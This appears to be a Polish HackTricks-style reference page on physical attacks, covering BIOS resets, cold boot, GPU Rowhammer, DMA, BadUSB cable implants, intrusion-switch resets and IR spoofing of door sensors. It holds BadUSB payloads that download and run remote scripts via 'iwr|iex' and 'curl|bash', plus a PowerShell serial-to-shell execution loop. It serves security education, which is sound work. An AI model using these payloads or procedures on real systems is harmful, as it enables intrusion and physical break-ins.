# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

## Odzyskiwanie haseł BIOS i bezpieczeństwo systemu

Ustawienia oprogramowania układowego starszych komputerów PC można zresetować, odłączając baterię CMOS lub używając opisanego w dokumentacji zworkowego resetu CMOS. Wymagany czas odłączenia zasilania zależy od płyty głównej, a hasła lub klucze nowoczesnego UEFI mogą być przechowywane w pamięci flash nieulotnej, kontrolerze wbudowanym lub urządzeniu zabezpieczającym, dlatego mogą przetrwać wyjęcie baterii. Przed zwieraniem pinów sprawdź instrukcję płyty głównej lub dokumentację serwisową; ta procedura może również unieważnić pomiary TPM i uruchomić odzyskiwanie klucza szyfrowania dysku.

W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą sprawdzać lub zmieniać ustawienia przechowywane w pamięci CMOS z poziomu środowiska rozruchowego. CmosPwd rozpoznaje formaty haseł z udokumentowanego zestawu starszych rodzin BIOS-u i może tworzyć kopię zapasową, przywracać lub usuwać/zerować stan CMOS; opublikowane wersje są przeznaczone dla starszych środowisk DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Te narzędzia nie są uniwersalnymi narzędziami do usuwania haseł UEFI i wymagają odpowiedniego dostępu do sprzętu/oprogramowania układowego.

Niektóre oprogramowanie układowe laptopów wyświetla kod weryfikacyjny specyficzny dla producenta po kilku nieudanych próbach wpisania hasła. Bazy danych, takie jak [bios-pw.org](https://bios-pw.org), mogą dla niektórych modeli wygenerować starsze hasła odzyskiwania producenta, ale wiele systemów blokuje dostęp bez możliwości wyprowadzenia kodu weryfikacyjnego. Traktuj każde wygenerowane hasło jako specyficzne dla danego modelu i unikaj wyczerpania limitu prób, po którym następuje trwała blokada.

### Zabezpieczenia UEFI

W nowoczesnych systemach **UEFI** CHIPSEC może audytować zabezpieczenia zmiennych Secure Boot. Najpierw uruchom poniższy test, który nie wprowadza zmian; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i należy go używać wyłącznie w systemie laboratoryjnym, który można odzyskać. CHIPSEC ostrzega, że jego uprzywilejowany sterownik i niskopoziomowy dostęp do sprzętu nie nadają się do użycia na produkcyjnych punktach końcowych.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM i ataki Cold Boot

DRAM nie traci natychmiast wszystkich bitów po zatrzymaniu odświeżania. Tempo zanikania danych znacznie różni się w zależności od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż cykl odłączenia zasilania bez chłodzenia. Atak Cold Boot polega na szybkim ponownym uruchomieniu urządzenia w niewielkim środowisku akwizycji lub przeniesieniu schłodzonego modułu, przechwyceniu surowej pamięci i odtworzeniu kluczy kryptograficznych mimo degradacji bitów. Narzędzie do kopiowania dysków nie jest automatycznie narzędziem do obrazowania pamięci fizycznej, a Volatility analizuje zrzut, zamiast go pozyskiwać; używaj odpowiedniego dla danej platformy, zweryfikowanego narzędzia do akwizycji.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer przeciwko tablicom stron

Współczesne ataki GPU Rowhammer stają się znacznie bardziej użyteczne, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Ostatnie badania nad **kartami NVIDIA Ampere z GDDR6** pokazują, że atakujący uruchamiający nieuprzywilejowany kod CUDA może tworzyć wzorce hammeringu specyficzne dla GPU, używać **memory massaging**, aby umieścić struktury stronicowania w podatnych wierszach, a następnie odwracać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Schemat eksploatacji

1. **Zidentyfikuj wiersze podatne na hammering** w GDDR6 i utwórz wzorce hammeringu uwzględniające odświeżanie / nierównomierne, które omijają mechanizmy zabezpieczające wbudowane w DRAM.
2. **Przygotuj alokacje GPU** tak, aby sterownik umieszczał struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast trzymać je w domyślnej, chronionej puli. W praktyce może to oznaczać wyczerpanie regionu tablic stron o niskich adresach pamięci i rozrzucenie dużych, rzadkich mapowań UVM z kontrolowanymi odstępami.
3. **Odwróć bity metadanych translacji**, takich jak **PFN** lub bity związane z aperturą, we wpisie tablicy stron / katalogu stron, aby kontrolowana przez atakującego strona wirtualna wskazywała strony tablic stron, dowolną pamięć GPU lub mapowania systemowe widoczne dla hosta.
4. Wykorzystaj ponownie sfałszowane mapowanie, aby przepisać kolejne wpisy translacji i uzyskać **dowolny odczyt/zapis pamięci GPU** w różnych kontekstach GPU.

### Przejście do hosta i środki zaradcze

- Przy **wyłączonym IOMMU** sfałszowane mapowania apertury systemowej mogą udostępnić GPU dowolną **pamięć fizyczną hosta**, zmieniając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** atakuje wpisy tablicy stron ostatniego poziomu, podczas gdy **GeForge** pokazuje, że łatwiej może być uszkodzić poziom katalogu stron, ponieważ odwrócenie jednego bitu może przekierować większe poddrzewo translacji. Nie traktuj tylko jednej warstwy stronicowania jako krytycznej z punktu widzenia bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę do dowolnej pamięci hosta wykorzystywaną przez GDDRHammer/GeForge, ale **nie jest kompletnym środkiem zaradczym**. **GPUBreach** pokazuje drugi etap ataku, w którym atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci w sterowniku NVIDIA, aby uzyskać prymityw umożliwiający zapis do jądra i **root shell**, nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
- **Systemowy ECC** to praktyczny krok wzmacniający zabezpieczenia na obsługiwanych kartach GPU do stacji roboczych i serwerów. Konsumenckie karty GPU bez ECC mają słabsze zabezpieczenia.<sup>[[4]](#references)</sup>
- Ataki te nie są czysto teoretyczne: **GeForge** zgłosił **1 171** odwróconych bitów na RTX 3060 i **202** na RTX A6000, co wystarczyło do zbudowania działającego łańcucha eskalacji uprawnień na hoście.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataki Direct Memory Access (DMA)

Informacje o offline’owym patchowaniu UEFI IFR/NVRAM, które może obniżyć poziom egzekwowania IOMMU przed uruchomieniem systemu i umożliwić atak DMA na Windows, znajdziesz tutaj:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** pokazuje pozyskiwanie i modyfikowanie pamięci za pomocą **DMA** przez interfejsy takie jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest po prostu „nieskuteczny wobec Windows 10”: możliwość wykorzystania zależy od interfejsu, kompilacji systemu docelowego, zasad IOMMU, stanu blokady oraz tego, czy funkcja Windows Kernel DMA Protection jest obsługiwana i włączona. Windows 10 w wersji 1803 i nowszych wprowadził Kernel DMA Protection na zgodnych platformach, znacząco zmieniając powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB do uzyskiwania dostępu do systemu

W przypadku niezaszyfrowanego lub już odblokowanego woluminu Windows środowisko offline może zastąpić pliki binarne funkcji ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, co pozwala uzyskać wiersz poleceń SYSTEM po użyciu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą edytować dane lokalnych kont SAM. Metody te nie omijają zablokowanego woluminu BitLocker i mogą uszkodzić dane uwierzytelniające chronione przez DPAPI/EFS; zachowaj kopie śledcze i kopie zapasowe.

**Kon-Boot** to komercyjne narzędzie do omijania uwierzytelniania podczas rozruchu, przeznaczone dla obsługiwanych konfiguracji Windows/macOS. Zgodność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje zablokowanego woluminu BitLocker.<sup>[[10]](#references)</sup>

---

## Obsługa funkcji zabezpieczeń Windows

### Skróty rozruchu i odzyskiwania

- **Delete/Supr**, F2, F10 lub inny klawisz producenta może otworzyć konfigurację firmware.
- **F8** otwiera starsze zaawansowane opcje rozruchu Windows tylko w konfiguracjach, w których ta ścieżka jest nadal włączona; obecnie sposób przejścia do odzyskiwania zależy od konfiguracji.
- Przytrzymanie **Shift** może w niektórych konfiguracjach zablokować automatyczne logowanie do Windows, choć ustawienia zasad/rejestru mogą wyłączyć to działanie.<sup>[[17]](#references)</sup>

### Urządzenia BAD USB

Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wprowadzać zdefiniowane wcześniej sekwencje klawiszy. Ładunek początkowo ma uprawnienia i dostęp do pulpitu zalogowanej sesji; ograniczają go jednak monity UAC, blokada ekranu, układ klawiatury, czas wykonywania oraz zasady dotyczące USB na punktach końcowych.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Uprawnienia administratora lub kopii zapasowych pozwalają utworzyć kopię w tle albo zapisać gałęzie rejestru, aby pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika zbierania danych po uzyskaniu dostępu, a nie sposób na obejście uprawnień. Należy powiązać ją ze zdarzeniami użycia `diskshadow`/VSS i eksportu gałęzi rejestru.

## Techniki implantów BadUSB / HID

### Implanty Wi-Fi w kablach

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się wewnątrz kabli USB-A→USB-C lub USB-C↔USB-C, zgłaszają się wyłącznie jako klawiatura USB i udostępniają stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z komputera ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
- Interfejs przeglądarkowy udostępnia karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane ładunki są oznaczane według systemu operacyjnego, układy klawiatury można zmieniać na bieżąco, a ciągi VID/PID można modyfikować, aby podszywać się pod znane urządzenia peryferyjne.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotować ładunki, uruchomić ich wykonanie i zarządzać danymi logowania Wi-Fi bez korzystania z sieci organizacji — jest to przydatne podczas krótkotrwałych fizycznych włamań.

### Ładunki AutoExec rozpoznające system operacyjny

- Reguły AutoExec przypisują jeden lub więcej ładunków do natychmiastowego uruchomienia po enumeracji USB. Implant wykonuje uproszczoną identyfikację systemu operacyjnego i wybiera pasujący skrypt.
- Przykładowy przebieg:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie odbywa się bez nadzoru, samo podmienienie kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Zdalny shell przez Wi-Fi TCP inicjowany za pomocą HID

1. **Inicjowanie za pomocą sekwencji klawiszy:** Zapisany ładunek otwiera konsolę i wkleja pętlę, która wykonuje wszystko, co otrzyma z nowego urządzenia USB serial. Minimalny wariant dla Windows to:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK Androida lub aplikację desktopową), który łączy się z powrotem z operatorem. Każdy bajt wpisany w sesji TCP jest przekazywany do opisanego wyżej obiegu szeregowego, co umożliwia zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Możliwości uzyskiwania danych wyjściowych są ograniczone, dlatego operatorzy zazwyczaj uruchamiają polecenia bez wglądu w ich wynik (tworzenie kont, przygotowywanie dodatkowych narzędzi itp.).

### Powierzchnia aktualizacji HTTP OTA

- Udokumentowany interfejs Evil Crow Cable udostępnia nieuwierzytelniony endpoint aktualizacji firmware’u pod adresem `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operatorzy terenowi mogą wymieniać funkcje w trakcie działania (np. wgrać firmware USB Army Knife) bez otwierania kabla, dzięki czemu implant może uzyskać nowe możliwości, pozostając podłączony do hosta docelowego.

## Omijanie szyfrowania BitLocker

Autoryzowane pozyskanie danych kryminalistycznych z działającego lub niedawno używanego systemu może ujawnić główny klucz woluminu BitLocker lub powiązany materiał kluczowy, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale powodzenie nie jest gwarantowane. Nowoczesny Windows szyfruje również zrzuty awaryjne, gdy włączony jest BitLocker, a zapisane 48-cyfrowe hasło odzyskiwania jest innym artefaktem niż klucz woluminu znajdujący się w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Inżynieria społeczna w celu dodania klucza odzyskiwania

Atakujący, który przekona administratora do uruchomienia poleceń zarządzających BitLockerem, może dodać hasło odzyskiwania, klucz zewnętrzny lub inny mechanizm ochrony, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem samych zer: numeryczne hasła odzyskiwania BitLockera muszą mieć poprawny, zweryfikowany format 48 cyfr. Składnia polecenia używana w autoryzowanym zarządzaniu to `manage-bde -protectors -add C: -recoverypassword`; dodane mechanizmy ochrony można wyświetlić poleceniem `manage-bde -protectors -get C:`. Monitoruj dodawanie mechanizmów ochrony i dopilnuj, by nowy materiał odzyskiwania był przechowywany wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>

---

## Wykorzystanie przełączników otwarcia obudowy / serwisowych do przywrócenia ustawień fabrycznych BIOS-u

Wiele nowoczesnych laptopów i komputerów stacjonarnych w małych obudowach ma **przełącznik otwarcia obudowy**, monitorowany przez kontroler Embedded Controller (EC) i firmware BIOS/UEFI. Głównym zadaniem przełącznika jest zgłaszanie alarmu po otwarciu urządzenia, ale niektórzy producenci implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu go w określonej sekwencji.<sup>[[5]](#references)[[6]](#references)</sup>

### Jak działa atak

1. Przełącznik jest podłączony do **przerwania GPIO** kontrolera EC.
2. Firmware działający na kontrolerze EC śledzi **czas i liczbę naciśnięć**.
3. Po rozpoznaniu zakodowanej na stałe sekwencji kontroler EC uruchamia procedurę *resetu płyty głównej*, która **usuwa zawartość systemowej pamięci NVRAM/CMOS**.
4. Przy kolejnym uruchomieniu urządzenia modele, których dotyczy ta funkcja, ładują zresetowany stan firmware’u. W zależności od producenta i wersji wyczyszczony stan może obejmować hasło nadzorcy, niestandardowe ustawienia rozruchu lub zarejestrowane klucze Secure Boot; stan TPM i wpływ na szyfrowanie dysku należy ocenić osobno.

> Reset firmware’u może przywrócić opcje rozruchu z urządzeń zewnętrznych, ale **nie** odszyfrowuje pamięci masowej. BitLocker lub inny system szyfrowania całego dysku może po zmianach TPM/firmware’u zażądać klucza odzyskiwania, nadal chroniąc dysk wewnętrzny bez niego.<sup>[[16]](#references)</sup>

### Przykład z praktyki – laptop Framework 13

Skrót odzyskiwania dla Framework 13 (11., 12. i 13. generacji) to:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Po dziesiątym cyklu EC ustawia flagę, która nakazuje BIOS-owi wyczyścić NVRAM podczas następnego uruchomienia. Cała procedura trwa około 40 s i wymaga **wyłącznie śrubokręta**.<sup>[[5]](#references)</sup>

### Ogólna procedura wykorzystania podatności

1. Włącz urządzenie docelowe lub wybudź je ze stanu uśpienia, aby EC działał.
2. Zdejmij dolną pokrywę, aby odsłonić przełącznik wykrywania otwarcia/serwisowy.
3. Odtwórz wzorzec przełączania specyficzny dla danego producenta (sprawdź dokumentację i fora lub przeprowadź reverse engineering firmware’u EC).
4. Złóż urządzenie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware’u i dane uwierzytelniające faktycznie uległy zmianie.
5. Jeśli masz upoważnienie i dostępne jest uruchamianie z nośnika zewnętrznego, uruchom kontrolowany obraz live. Gdy wewnętrzny wolumin zostanie legalnie odblokowany (lub nigdy nie był szyfrowany), środowisko live może pozyskać dane uwierzytelniające i dane albo sprawdzić EFI System Partition. Modyfikacja tej partycji w celu zainstalowania implantu EFI jest trwała i wysoce inwazyjna, a ponadto podlega ograniczeniom wynikającym z Secure Boot, measured boot, ochrony firmware’u przed zapisem oraz monitorowania punktów końcowych. Zaszyfrowana pamięć pozostaje niedostępna bez klucza lub materiału odzyskiwania.

### Wykrywanie i ograniczanie ryzyka

* Rejestruj zdarzenia wykrycia otwarcia obudowy w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS-u.
* Używaj **plomb zabezpieczających przed manipulacją** na śrubach/pokrywach, aby wykrywać otwarcie.
* Przechowuj urządzenia w **fizycznie kontrolowanych strefach**; zakładaj, że dostęp fizyczny oznacza pełne przejęcie.
* Jeśli jest taka możliwość, wyłącz funkcję producenta „reset przełącznikiem serwisowym” lub wymagaj dodatkowego uwierzytelnienia kryptograficznego przy resetowaniu NVRAM.

---

## Potajemne wstrzykiwanie IR w czujniki wyjścia bezdotykowego

### Charakterystyka czujnika
- Popularne czujniki „wave-to-exit” łączą emiter diody LED bliskiej podczerwieni z odbiornikiem w stylu pilota do telewizora, który zgłasza stan wysoki na wyjściu logicznym dopiero po odebraniu wielu impulsów (~4–10) o właściwej częstotliwości nośnej (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastikowa osłona uniemożliwia nadajnikowi i odbiornikowi bezpośrednie widzenie się, więc kontroler zakłada, że każdy zweryfikowany sygnał nośny pochodzi od pobliskiego odbicia, i uruchamia przekaźnik otwierający zaczep drzwiowy.
- Gdy kontroler uzna, że wykryto obiekt, często zmienia obwiednię modulacji sygnału wychodzącego, ale odbiornik nadal akceptuje każdy impuls pasujący do filtrowanego sygnału nośnego.

### Przebieg ataku
1. **Zarejestruj profil emisji** – podłącz analizator logiczny do pinów kontrolera, aby zarejestrować przebiegi przed detekcją i po niej, które sterują wewnętrzną diodą LED IR.
2. **Odtwórz tylko przebieg „po detekcji”** – odłącz lub zignoruj fabryczny nadajnik i steruj zewnętrzną diodą LED IR, od początku emitując wzorzec po wykryciu. Ponieważ odbiornik sprawdza tylko liczbę impulsów i częstotliwość, uznaje podrobiony sygnał nośny za prawdziwe odbicie i aktywuje linię przekaźnika.
3. **Włącz bramkowanie transmisji** – nadawaj sygnał nośny w dostrojonych seriach (np. przez kilkadziesiąt milisekund, z podobnymi przerwami), aby dostarczyć minimalną liczbę impulsów bez nasycania układu AGC odbiornika ani logiki obsługi zakłóceń. Ciągła emisja szybko obniża czułość czujnika i uniemożliwia zadziałanie przekaźnika.

### Zdalne wstrzykiwanie sygnału przez odbicia
- Zastąpienie warsztatowej diody LED mocną diodą IR, sterownikiem MOSFET i optyką skupiającą pozwala niezawodnie wyzwalać czujnik z odległości ~6 m.
- Atakujący nie musi znajdować się w polu widzenia apertury odbiornika; skierowanie wiązki na ściany wewnętrzne, regały lub ościeżnice widoczne przez szybę pozwala odbitej energii trafić w pole widzenia ~30° i naśladować ruch ręki z bliska.
- Ponieważ odbiorniki oczekują jedynie słabych odbić, znacznie silniejsza wiązka zewnętrzna może odbijać się od wielu powierzchni i nadal przekraczać próg detekcji.

### Latarka do ataku
- Umieszczenie sterownika wewnątrz zwykłej latarki pozwala ukryć narzędzie na widoku. Zastąp widoczną diodę LED mocną diodą LED IR dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania serii impulsów o częstotliwości ≈30 kHz i użyj MOSFET-a do odprowadzania prądu diody LED.
- Teleskopowa soczewka zoom zawęża wiązkę, zwiększając jej zasięg i precyzję, a sterowany przez MCU silnik wibracyjny zapewnia haptyczne potwierdzenie aktywnej modulacji bez emisji światła widzialnego.
- Przełączanie między kilkoma zapisanymi wzorcami modulacji (nieznacznie różniącymi się częstotliwościami nośnymi i obwiedniami) zwiększa zgodność z różnymi rodzinami czujników sprzedawanymi pod innymi markami. Operator może omiatać odbijające powierzchnie, aż przekaźnik kliknie i drzwi się otworzą.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)

{{#include ../banners/hacktricks-training.md}}
